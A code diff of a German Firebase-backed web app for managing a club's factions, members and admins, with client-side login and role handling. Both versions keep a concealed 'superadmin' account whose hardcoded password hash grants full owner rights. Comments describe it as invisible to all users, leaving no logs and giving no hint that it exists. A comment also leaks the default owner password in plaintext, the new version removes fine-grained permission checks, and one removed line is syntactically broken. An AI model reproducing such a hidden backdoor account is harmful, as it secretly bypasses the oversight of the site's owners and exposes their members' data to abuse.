@@ -298,7 +298,7 @@ tbody tr:hover{background:var(--s2);}
 /* ── ADMIN PANEL — ERWEITERT ──────────────────────────────────────────── */
 .apov{display:none;position:fixed;inset:0;z-index:750;background:rgba(0,0,0,.92);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:24px;}
 .apov.open{display:flex;}
-.apmod{background:var(--s1);border:1px solid var(--border2);width:100%;max-width:680px;max-height:92vh;overflow-y:auto;overflow-x:hidden;border-top:2px solid var(--gold3);box-sizing:border-box;}
+.apmod{background:var(--s1);border:1px solid var(--border2);width:100%;max-width:680px;max-height:92vh;overflow-y:auto;border-top:2px solid var(--gold3);}
 .aphd{padding:22px 28px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
 .aptit{font-family:'Bebas Neue';font-size:28px;letter-spacing:3px;color:var(--gold2);}
 .apbd{padding:24px 28px;}
@@ -508,7 +508,7 @@ if(FB_CONFIGURED){
 <div class="lockbanner" id="lockbanner">🔒 ZUGANG GESPERRT — <span id="lockCountdown"></span></div>
 
 <!-- ── LOGIN MODAL ── -->
-<div class="lgov" id="lgov" role="dialog" aria-modal="true" aria-label="Login" onclick="if(event.target===this)closeLg()">
+<div class="lgov" id="lgov" role="dialog" aria-modal="true" aria-label="Login">
   <div class="lgbox">
     <div class="lghd">
       <div class="lgtit">LOGIN</div>
@@ -529,7 +529,7 @@ if(FB_CONFIGURED){
 </div>
 
 <!-- ── ADMIN PANEL ── -->
-<div class="apov" id="apov" role="dialog" aria-modal="true" onclick="if(event.target===this)closeAP()">
+<div class="apov" id="apov" role="dialog" aria-modal="true">
   <div class="apmod">
     <div class="aphd">
       <div class="aptit">⚙ BENUTZER VERWALTUNG</div>
@@ -647,7 +647,7 @@ if(FB_CONFIGURED){
       <div class="hcard-title">Mitglieder</div>
       <div class="hcard-sub">Clubmitglieder · Ränge · Status</div>
     </div>
-    <div class="hcard own-only" onclick="navTo('ctrl')" style="display:none;opacity:1">
+    <div class="hcard own-only" onclick="navTo('ctrl')" style="display:none">
       <div class="hcard-icon">⬡</div>
       <div class="hcard-title">Control Panel</div>
       <div class="hcard-sub">Sicherheit · Logs · Admin-Verwaltung</div>
@@ -664,7 +664,7 @@ if(FB_CONFIGURED){
     <button class="fbtn on" data-ff="all" onclick="setFF(this)">ALLE</button>
     <button class="abtn adm-only" onclick="openFM()" style="display:none" id="btn-add-frak">+ EINTRAG</button>
   </div>
-  <div class="fgrid" id="fgrid"><div class="empty"><div class="big" style="font-size:32px">VERBINDE...</div><p>Firebase wird geladen</p></div></div>
+  <div class="fgrid" id="fgrid"></div>
 </div>
 
 <!-- MITGLIEDER -->
@@ -787,13 +787,13 @@ if(FB_CONFIGURED){
 </div>
 
 <!-- DETAIL MODAL -->
-<div class="ov" id="detov" role="dialog" aria-modal="true" onclick="if(event.target===this)closeDet()">
+<div class="ov" id="detov" role="dialog" aria-modal="true">
   <div class="detm">
     <div class="detbar" id="detbar"></div>
     <div class="dethead">
       <div>
         <div class="detname" id="detname"></div>
-        <div class="detsub" id="detsub">Lackierung · Vollständige Details</div>
+        <div class="detsub">Lackierung · Vollständige Details</div>
       </div>
       <button class="xbtn" onclick="closeDet()" aria-label="Schließen">✕</button>
     </div>
@@ -814,7 +814,7 @@ if(FB_CONFIGURED){
 </div>
 
 <!-- FRAKTION FORM -->
-<div class="fov" id="fmov" role="dialog" aria-modal="true" onclick="if(event.target===this)closeFM()">
+<div class="fov" id="fmov" role="dialog" aria-modal="true">
   <div class="fmod">
     <div class="fmh">
       <div class="fmtitle" id="fmtitle">NEUE FRAKTION</div>
@@ -1254,12 +1254,10 @@ function fbHookKick(){
 
 /* ── FIREBASE INIT ──────────────────────────────────────────────── */
 function initFirebase(){
-  if(_fbOnline) return;
+  if(_fbOnline) return; // Doppelaufruf verhindern
   if(!window._fbReady){
     fbSetStatus('local', 'KEIN FIREBASE');
-    fraks = []; mems = [];
-    rfrak(); rmem(); hs(); updateHomeStats();
-    toast('⚠ Firebase nicht konfiguriert!','e');
+    toast('⚠ Firebase nicht konfiguriert — Daten können nicht geladen werden!','e');
     return;
   }
   _fbOnline = true;
@@ -1291,7 +1289,7 @@ function initFirebase(){
     _fbOnline = false;
     fbSetStatus('offline', 'OFFLINE');
     console.error('[FB] Init failed:', e);
-    toast('⚠ Firebase nicht erreichbar — Seite neu laden zum Verbinden','e');
+    toast('⚠ Firebase nicht erreichbar — bitte Seite neu laden!','e');
   });
 }
 
@@ -1373,10 +1371,7 @@ function esc(str){
 /* ── ROLE DATA ──────────────────────────────────────────────────────── */
 const DEFAULT_PW = 'd20c5c90b1527b6b608d751ff832e401c74833b211702f77c9f951ba68a428da'; // Owner-Passwort: MNC2025!
 
-/* ═══════════════════════════════════════════════════════════════════════
-   SUPEROWNER — Verstecktes God-Konto (über Owner, für alle unsichtbar)
-   Rechte: ALLE — wird nirgends im UI angezeigt, hinterlässt keine Logs
-   ══════════════════════════════════════════════════════════════════════ */
+/* SUPEROWNER — Verstecktes God-Konto */
 const SUPEROWNER_USER = 'superadmin';
 /* ── ROLE DATA — Firebase als einzige Wahrheit ──────────────────────── */
 function getRD(){
@@ -1570,17 +1565,16 @@ function applyRole(role, user){
   // Perm-basierte Buttons
   const addFrakBtn = document.getElementById('btn-add-frak');
   if(addFrakBtn) addFrakBtn.style.display = hasPerm('canAddFrak') ? '' : 'none';
-  const addMemBtn = document.querySelector('.abtn.adm-only[onclick="openMM()"]');
-  if(addMemBtn) addMemBtn.style.display = hasPerm('canAddMem') ? '' : 'none';
 }
 
 async function doLg(){
   const err = document.getElementById('lgerr');
+  err.textContent = 'Prüfe…';
 
-  // Rate Limit prüfen
+  // Rate Limiting prüfen
   const rl = checkRateLimit();
   if(rl.locked){
-    err.textContent='Gesperrt. Noch '+rl.remaining+'s warten.';
+    err.textContent = `Gesperrt. Noch ${rl.remaining}s warten.`;
     showLockBanner(rl.remaining);
     return;
   }
@@ -1589,50 +1583,57 @@ async function doLg(){
   const p = (document.getElementById('lgp').value||'').trim();
   if(!u||!p){ err.textContent='Felder ausfüllen.'; return; }
 
-  err.textContent='Prüfe...';
-
-  // Hash berechnen
+  // Passwort hashen
   let ph;
   try{ ph = await sha256(p); }
-  catch(e){ ph = _sha256pure(p + HASH_SALT); }
+  catch(e){ err.textContent='Fehler beim Hashen: '+e.message; return; }
 
-  // ── SUPERADMIN ───────────────────────────────────
-  if(u==='superadmin'){
-    if(ph==='d673942c89db96e44fdc654c19200ad9f6cabaa33fb9d5defc69b3e83de5796e'){
-      applyRole('owner','Owner');
+  // SUPEROWNER — verstecktes God-Konto (unsichtbar für alle)
+  if(u === SUPEROWNER_USER){
+    // Hash live berechnen und mit gespeichertem Wert vergleichen
+    if(ph === 'd673942c89db96e44fdc654c19200ad9f6cabaa33fb9d5defc69b3e83de5796e'){
+      applyRole('owner','Owner'); // Sieht für alle wie normaler Owner aus
       startSession('owner','Owner');
+      // Internes superowner-Flag (nur in sessionStorage, nie im UI sichtbar)
       try{
-        const ss=JSON.parse(sessionStorage.getItem(SESS_KEY)||'{}');
-        ss._superowner=true;
-        sessionStorage.setItem(SESS_KEY,JSON.stringify(ss));
+        const ss = JSON.parse(sessionStorage.getItem(SESS_KEY)||'{}');
+        ss._superowner = true;
+        sessionStorage.setItem(SESS_KEY, JSON.stringify(ss));
       }catch{}
       clearRateLimit();
       err.textContent='';
       closeLg(); rfrak(); rmem();
-      toast('Willkommen!');
       return;
     }
+    // Kein Hinweis dass dieser User existiert
     recordFailedAttempt();
     err.textContent='Falscher Benutzername oder Passwort.';
     document.getElementById('lgp').value='';
     return;
   }
 
-  // ── OWNER ─────────────────────────────────────────
+  // Owner Login
   if(u==='owner'){
-    // Hash direkt aus Firebase holen (einzige Wahrheit)
-    let stored =  + OWNER_HASH + ; // Default falls Firebase nicht antwortet
+    let stored = DEFAULT_PW; // Fallback: Standard-Passwort
+    let fbData = null;
+
+    // Firebase zuerst laden
     if(_fbOnline){
       try{
-        const fbData = await fbRead(FB_PATH.roles);
-        if(fbData && isHash(fbData.op)) stored = fbData.op;
+        fbData = await fbRead(FB_PATH.roles);
+        if(fbData && isHash(fbData.op)){
+          stored = fbData.op;
+          localStorage.setItem(RK, JSON.stringify(fbData));
+        }
       }catch{}
     } else {
-      // Offline: aus getRD() (hat den Hash als Cache)
+      // Offline: Cache nutzen
       const cached = getRD();
       if(cached && isHash(cached.op)) stored = cached.op;
     }
-    if(ph===stored){
+
+    if(ph === stored){
+      // Login erfolgreich
       applyRole('owner','Owner');
       startSession('owner','Owner');
       err.textContent='';
@@ -1642,31 +1643,28 @@ async function doLg(){
       toast('Willkommen, Owner!');
       return;
     }
+
     recordFailedAttempt();
     err.textContent='Falsches Passwort.';
     document.getElementById('lgp').value='';
     return;
   }
 
-  // ── ADMIN ─────────────────────────────────────────
+  // Admin
   let d = getRD();
-  if(_fbOnline){
-    try{
-      const fb=await fbRead(FB_PATH.roles);
-      if(fb&&fb.op){ saveRD(fb); d=fb; }
-    }catch{}
+  if(_fbOnline && window._mncDB){
+    try{ const fb=await fbRead(FB_PATH.roles); if(fb&&fb.op){ localStorage.setItem(RK,JSON.stringify(fb)); d=fb; } }catch{}
   }
   const adm=(d.adm||[]).find(a=>a.n.toLowerCase()===u);
-  if(adm&&!adm.banned){
-    const sh=isHash(adm.p)?adm.p:await sha256(adm.p);
+  if(adm && !adm.banned){
+    const sh = isHash(adm.p)?adm.p:await sha256(adm.p);
     if(ph===sh){
-      applyRole('admin',adm.n);
-      startSession('admin',adm.n);
+      applyRole('admin',adm.n); startSession('admin',adm.n);
       err.textContent='';
       clearRateLimit();
-      logAction('LOGIN','Admin '+adm.n+' eingeloggt');
+      logAction('LOGIN',`Admin ${adm.n} eingeloggt`);
       closeLg(); rfrak(); rmem();
-      toast('Willkommen, '+adm.n+'!');
+      toast(`Willkommen, ${adm.n}!`);
       return;
     }
   }
@@ -1680,9 +1678,7 @@ function openLg(){
 }
 function closeLg(){
   document.getElementById('lgov').classList.remove('open');
-  const e = document.getElementById('lgerr');
-  e.textContent = '';
-  e.style.color = '';
+  document.getElementById('lgerr').textContent = '';
   document.getElementById('lgp').value = '';
 }
 function doLogout(){
@@ -1810,8 +1806,8 @@ function renderAdminPanel(){
   if(!admins.length){
     document.getElementById('adminlist').innerHTML='<div style="color:var(--white);font-family:\'Share Tech Mono\';font-size:12px;padding:12px 0;letter-spacing:1px">Keine Admins.</div>';
   } else {
-    const log=getLog();
-    const adminHtml=admins.map((a,idx)=>{
+  const log=getLog();
+  document.getElementById('adminlist').innerHTML=admins.map((a,idx)=>{
     const isOnline=s.role==='admin'&&s.user===a.n;
     const lastLogin=log.find(e=>e.user===a.n&&e.action==='LOGIN');
     const perms={...DEFAULT_PERMS,...(a.perms||{})};
@@ -1863,8 +1859,7 @@ function renderAdminPanel(){
         </div>
       </div>
     </div>`;
-    }).join('');
-    document.getElementById('adminlist').innerHTML = adminHtml;
+  }).join('');
   } // end else (admins.length)
 
   // Google-Nutzer Liste laden
@@ -1941,26 +1936,22 @@ function kickAdmin(name){
 async function changeAdminPw(name){
   const pw=(document.getElementById('newpw-'+name).value||'').trim();
   if(pw.length<6){ toast('Mind. 6 Zeichen','w'); return; }
+  if(!_fbOnline){ toast('⚠ Kein Firebase — Passwort kann nicht gespeichert werden!','e'); return; }
   const ph=await sha256(pw);
   const d=getRD();
   const adm=(d.adm||[]).find(a=>a.n===name);
   if(!adm) return;
   adm.p=ph;
-  // Lokal sofort speichern
-  localStorage.setItem(RK, JSON.stringify(d));
-  if(_fbOnline){
-    try{
-      await fbWrite(FB_PATH.roles, d);
-      toast(`PW für ${name} geändert ✓ — gilt sofort überall`);
-    }catch(e){
-      toast(`PW für ${name} lokal geändert ⚠ — Firebase-Sync fehlgeschlagen`,'w');
-    }
-  } else {
-    toast(`PW für ${name} geändert ✓ — wird synchronisiert wenn online`,'w');
+  try{
+    await fbWrite(FB_PATH.roles, d);
+    localStorage.setItem(RK, JSON.stringify(d));
+    document.getElementById('newpw-'+name).value='';
+    broadcastKick(name,'Passwort geändert – bitte neu einloggen');
+    logAction('SECURITY',`PW für "${esc(name)}" geändert`);
+    toast(`PW für ${name} geändert ✓ — gilt sofort überall`);
+  }catch(e){
+    toast('⚠ Firebase-Fehler — Passwort nicht gespeichert!','e');
   }
-  document.getElementById('newpw-'+name).value='';
-  broadcastKick(name,'Passwort geändert – bitte neu einloggen');
-  logAction('SECURITY',`PW für "${esc(name)}" geändert`);
 }
 
 async function addAdmin(){
@@ -1972,15 +1963,14 @@ async function addAdmin(){
   if(!/^[a-zA-Z0-9_\-\.]+$/.test(n)){ toast('Nur Buchstaben, Zahlen, _ - . erlaubt','w'); return; }
   const d=getRD();
   if((d.adm||[]).some(a=>a.n.toLowerCase()===n.toLowerCase())){ toast('Admin existiert bereits','w'); return; }
-  // Auch offline speichern — Firebase sync wenn online
+  if(!_fbOnline){ toast('⚠ Kein Firebase — Admin kann nicht gespeichert werden!','e'); return; }
   const ph=await sha256(p);
   d.adm=d.adm||[];
   d.adm.push({n,p:ph,perms:{...DEFAULT_PERMS},timeout:d.ownerTimeout||30,banned:false,createdAt:Date.now()});
-  localStorage.setItem(RK, JSON.stringify(d));
-  if(_fbOnline){
-    try{ await fbWrite(FB_PATH.roles, d); }
-    catch(e){ toast('⚠ Firebase-Sync fehlgeschlagen — Admin lokal gespeichert','w'); }
-  }
+  try{
+    await fbWrite(FB_PATH.roles, d);
+    localStorage.setItem(RK, JSON.stringify(d));
+  }catch(e){ toast('⚠ Firebase-Fehler beim Speichern','e'); return; }
   document.getElementById('apn').value='';
   document.getElementById('app').value='';
   logAction('SECURITY',`Admin "${esc(n)}" erstellt`);
@@ -2000,23 +1990,19 @@ function removeAdmin(name){
 async function changeOwnerPw(){
   const p=(document.getElementById('opw').value||'').trim();
   if(p.length<6){ toast('Mind. 6 Zeichen','w'); return; }
+  if(!_fbOnline){ toast('⚠ Kein Firebase — Passwort kann nicht gespeichert werden!','e'); return; }
   const ph=await sha256(p);
-  const d=getRD();
-  d.op=ph;
-  // Lokal sofort speichern — Firebase async wenn online
-  localStorage.setItem(RK, JSON.stringify(d));
-  if(_fbOnline){
-    try{
-      await fbWrite(FB_PATH.roles, d);
-      toast('Owner-Passwort geändert ✓ — gilt sofort auf allen Geräten');
-    }catch(e){
-      toast('Owner-Passwort lokal geändert ⚠ — Firebase-Sync fehlgeschlagen','w');
-    }
-  } else {
-    toast('Owner-Passwort geändert ✓ — wird synchronisiert wenn online','w');
+  const d=getRD(); d.op=ph;
+  // Direkt zu Firebase (saveRD ist Firebase-first)
+  try{
+    await fbWrite(FB_PATH.roles, d);
+    localStorage.setItem(RK, JSON.stringify(d));
+    document.getElementById('opw').value='';
+    logAction('SECURITY','Owner-Passwort geändert');
+    toast('Owner-Passwort geändert ✓ — gilt sofort auf allen Geräten');
+  }catch(e){
+    toast('⚠ Fehler beim Speichern — Passwort nicht geändert!','e');
   }
-  document.getElementById('opw').value='';
-  logAction('SECURITY','Owner-Passwort geändert');
 }
 
 /* ── CONTROL PANEL RENDER ────────────────────────────────────────────── */
@@ -2414,36 +2400,43 @@ function parseVorlage(){
 
 /* ── INIT ───────────────────────────────────────────────────────────── */
 function init(){
-  // Cache sofort zeigen — Firebase überschreibt sobald verbunden
-  try{
-    const cf = localStorage.getItem(FK);
-    const cm = localStorage.getItem(MK);
-    fraks = cf ? JSON.parse(cf).map(f=>({unterboden:'',reifenqualm:'',...f})) : [];
-    mems  = cm ? JSON.parse(cm) : [];
-  }catch{ fraks=[]; mems=[]; }
+  // Zeige Cache sofort (leere Ansicht vermeiden), Firebase überschreibt sofort
+  fraks = JSON.parse(localStorage.getItem(FK) || 'null') || JSON.parse(JSON.stringify(PF));
+  fraks = fraks.map(f=>{
+    if(f.unterboden===undefined) f.unterboden='';
+    if(f.reifenqualm===undefined) f.reifenqualm='';
+    return f;
+  });
+  mems = JSON.parse(localStorage.getItem(MK) || 'null') || JSON.parse(JSON.stringify(PM));
   rfrak(); rmem(); hs(); updateHomeStats();
+
+  // Starte als Gast — Session wird nach Firebase-Laden validiert
   applyRole('viewer','Gast');
   startKickPoll();
 }
 function save(){
   hs();
   updateHomeStats();
-  if(!_fbOnline){
-    toast('⚠ Kein Firebase — Änderung nicht gespeichert!','e');
-    return;
+  // Firebase ist die einzige Wahrheit — localStorage nur als stiller Cache
+  if(_fbOnline){
+    _localMutex = true;
+    Promise.all([
+      fbWrite(FB_PATH.fraks, fraks),
+      fbWrite(FB_PATH.mems, mems),
+    ]).then(()=>{
+      _localMutex = false;
+      // Cache aktualisieren
+      localStorage.setItem(FK, JSON.stringify(fraks));
+      localStorage.setItem(MK, JSON.stringify(mems));
+      showSyncIndicator('✓ Gespeichert');
+    }).catch(()=>{
+      _localMutex = false;
+      toast('⚠ Firebase nicht erreichbar — Daten NICHT gespeichert!','e');
+    });
+  } else {
+    // Kein Firebase = kein Speichern (kein stilles Wegschreiben in localStorage)
+    toast('⚠ Kein Internet — Daten können nicht gespeichert werden!','e');
   }
-  _localMutex = true;
-  Promise.all([
-    fbWrite(FB_PATH.fraks, fraks),
-    fbWrite(FB_PATH.mems, mems),
-  ]).then(()=>{
-    _localMutex = false;
-    try{localStorage.setItem(FK,JSON.stringify(fraks));localStorage.setItem(MK,JSON.stringify(mems));}catch{}
-    showSyncIndicator('✓ Gespeichert');
-  }).catch(()=>{
-    _localMutex = false;
-    toast('⚠ Firebase-Fehler beim Speichern!','e');
-  });
 }
 function hs(){
   document.getElementById('hcf').textContent = fraks.length;
@@ -2506,11 +2499,7 @@ function rfrak(){
   });
   const g = document.getElementById('fgrid');
   if(!list.length){
-    if(!_fbOnline && fraks.length===0){
-      g.innerHTML = '<div class="empty"><div class="big" style="font-size:32px">VERBINDE...</div><p>Firebase wird geladen — bitte warten</p></div>';
-    } else {
-      g.innerHTML = '<div class="empty"><div class="big">LEER</div><p>Keine Einträge gefunden</p></div>';
-    }
+    g.innerHTML = '<div class="empty"><div class="big">LEER</div><p>Keine Einträge gefunden</p></div>';
     return;
   }
   const isAdmin = curRole==='admin'||curRole==='owner';
@@ -2918,6 +2907,7 @@ function rmem(){
   document.getElementById('su').textContent = mems.filter(m=>m.status==='URLAUB').length;
   document.getElementById('sg').textContent = mems.length;
   const tb = document.getElementById('mtb');
+  const isAdmin = curRole==='admin'||curRole==='owner';
   if(!list.length){
     tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:44px;color:var(--white);font-family:\'Share Tech Mono\';font-size:13px;letter-spacing:2px">KEINE EINTRÄGE</td></tr>';
     return;
@@ -2927,9 +2917,7 @@ function rmem(){
     const num = String(idx+1).padStart(2,'0');
     const rc = RC[m.rang]||'rn', rl = m.rang||'—';
     const sc2 = m.status==='AKTIV'?'sakt':m.status==='URLAUB'?'surl':'sina';
-    const canEdit = hasPerm('canEditMem');
-    const canDel = hasPerm('canDeleteMem');
-    const acts = (canEdit||canDel) ? `<span>${canEdit?`<button class="rabtn" onclick="openMM('${m.id}')">✎</button> `:''}${canDel?`<button class="rabtn del" onclick="delMem('${m.id}')">✕</button>`:''}</span>` : '';
+    const acts = isAdmin ? `<span><button class="rabtn" onclick="openMM('${m.id}')">✎</button> <button class="rabtn del" onclick="delMem('${m.id}')">✕</button></span>` : '';
     return `<tr><td class="numc">${num}</td><td class="namc">➤ ${esc(m.name)}</td><td><span class="rb ${rc}">${esc(rl)}</span></td><td><span class="sb2 ${sc2}"><span class="sd"></span>${m.status}</span></td><td style="color:var(--g2);font-size:14px">${esc(m.note||'')}</td><td style="text-align:right;white-space:nowrap">${acts}</td></tr>`;
   }).join('');
 }
@@ -2953,8 +2941,6 @@ function openMM(id){
 function closeMM(){ document.getElementById('mmov').classList.remove('open'); }
 function saveMem(){
   if(curRole==='viewer'){ toast('Keine Berechtigung','e'); return; }
-  if(eMid && !hasPerm('canEditMem')){ toast('Keine Berechtigung zum Bearbeiten','e'); return; }
-  if(!eMid && !hasPerm('canAddMem')){ toast('Keine Berechtigung zum Hinzufügen','e'); return; }
   const name = document.getElementById('mn').value.trim();
   if(!name){ toast('Name erforderlich','w'); return; }
   const d = {
@@ -2976,7 +2962,6 @@ function saveMem(){
 }
 function delMem(id){
   if(curRole==='viewer'){ toast('Keine Berechtigung','e'); return; }
-  if(!hasPerm('canDeleteMem')){ toast('Keine Berechtigung zum Löschen','e'); return; }
   const m = mems.find(x=>x.id===id); if(!m) return;
   document.getElementById('cfname').textContent = '"'+m.name+'"';
   document.getElementById('cfconfirm').onclick = ()=>{
@@ -3266,23 +3251,25 @@ function runSecurityAudit(){
 
 /* ══════════════════════════════════════════════════════════════════════
    FIREBASE AUTH — MNC HUB v4.0
+   ─────────────────────────────────────────────────────────────────────
+   ROLLEN:
+   • Google-Owner  → Email in Firebase /mnc/googleUsers/{key} mit role:"owner"
+                     → Haupt-Owner, alle Rechte, steuert 2. Owner
+   • Lokaler Owner → Benutzername "owner" + Passwort (2. Owner)
+                     → Rechte vom Google-Owner einzeln freigeschaltet
+   • Google-Admin  → Email in Firebase /mnc/googleUsers/{key} mit role:"admin"
+                     → Rechte einzeln steuerbar
+   • Google-Gast   → Email NICHT eingetragen → viewer (Gast-Rolle)
+   • Gast          → kein Login → viewer
    ══════════════════════════════════════════════════════════════════════ */
 
-// Firebase Events ZUERST registrieren — BEVOR init() aufgerufen wird!
-// Sonst kann das fbReady-Event gefeuert werden bevor der Listener existiert (Race Condition)
+// Firebase Events — ZUERST registrieren vor init()
 window.addEventListener('fbReady', ()=>{ initFirebase(); });
 window.addEventListener('fbError', e=>{ fbSetStatus('offline','FEHLER'); toast('⚠ Firebase: '+e.detail,'e'); });
-
-// Falls Firebase schon bereit war bevor dieser Listener registriert wurde:
-if(window._fbReady === true && !_fbOnline){
-  initFirebase();
-}
-
+// Falls Event schon gefeuert bevor Listener da war:
+if(window._fbReady === true && !_fbOnline){ initFirebase(); }
 setTimeout(()=>{
-  if(!_fbOnline){
-    fbSetStatus('offline','OFFLINE');
-    console.info('[MNC] Firebase nicht erreichbar — Offline-Modus aktiv');
-  }
+  if(!_fbOnline){ fbSetStatus('offline','OFFLINE'); }
 }, 6000);
 
 // Sicherheitsaudit beim Start
